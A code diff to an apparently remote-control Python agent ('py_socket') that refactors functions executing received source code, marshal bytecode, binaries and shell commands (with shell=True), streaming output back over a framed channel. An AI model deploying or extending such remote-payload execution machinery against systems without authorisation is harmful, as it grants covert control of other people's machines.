@@ -13,8 +13,9 @@ CH_STDERR: int = 2
 
 
 def hash_value(data: str | bytes) -> str:
-    if isinstance(data, str):
-        data = data.encode()
+    match data:
+        case str():
+            data = data.encode()
 
     return hashlib.sha256(data).hexdigest()
 
@@ -47,18 +48,18 @@ def remove_file(target_path: str) -> None:
         os.remove(target_path)
 
 
-def execute_source(code: str, filename: str = "<remote_payload>") -> None:
+def execute_source(code: str, filename: str = "<remote_payload>", scope: dict[str, object] | None = None) -> None:
     try:
         compiled = compile(code, filename, "exec")
-        exec(compiled, globals())  # noqa: S102
+        exec(compiled, scope if scope is not None else globals())  # noqa: S102
     except (Exception, SystemExit) as exc:
         print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
 
 
-def execute_bytecode(data: bytes) -> None:
+def execute_bytecode(data: bytes, scope: dict[str, object] | None = None) -> None:
     try:
         code_obj = marshal.loads(data)
-        exec(code_obj, globals())  # noqa: S102
+        exec(code_obj, scope if scope is not None else globals())  # noqa: S102
     except (Exception, SystemExit) as exc:
         print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
 
@@ -88,7 +89,7 @@ def execute_binary(filepath: str, *args: str, cleanup: bool = False) -> None:
             remove_file(filepath)
 
 
-def execute_system_command(command: str) -> None:
+def execute_system_command(command: str, output_buffer: object | None = None) -> None:
     proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S602
     send_fn = globals().get("_send_frame")
 
@@ -98,7 +99,9 @@ def execute_system_command(command: str) -> None:
         if not chunk:
             break
 
-        if send_fn:
+        if output_buffer is not None:
+            output_buffer.write(chunk)
+        elif send_fn:
             send_fn(CH_STDOUT, chunk)
         else:
             sys.stdout.buffer.write(chunk)
